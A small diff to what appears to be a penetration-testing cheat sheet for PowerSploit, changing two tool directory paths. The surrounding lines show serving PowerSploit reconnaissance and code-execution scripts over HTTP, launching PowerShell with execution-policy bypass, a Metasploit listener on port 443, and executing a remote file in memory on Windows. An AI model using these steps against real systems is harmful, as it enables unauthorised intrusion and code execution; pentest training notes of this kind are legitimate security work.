@@ -94,7 +94,7 @@ Get-Help <tool>                        Get help on any tool
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Download a file
-cd /usr/share/windows-resources/powersploit/Recon/
+cd /opt/PowerSploit/Recon/
 python3 -m http.server 80
 
 powershell -nop -exec bypass
@@ -121,7 +121,7 @@ set lport 443
 exploit -j
 
 - Open a new tab
-cd /usr/share/windows-resources/powersploit/CodeExecution/
+cd /opt/PowerSploit/CodeExecution/
 python3 -m http.server 80
 
 - Windows execute a remote file in memory
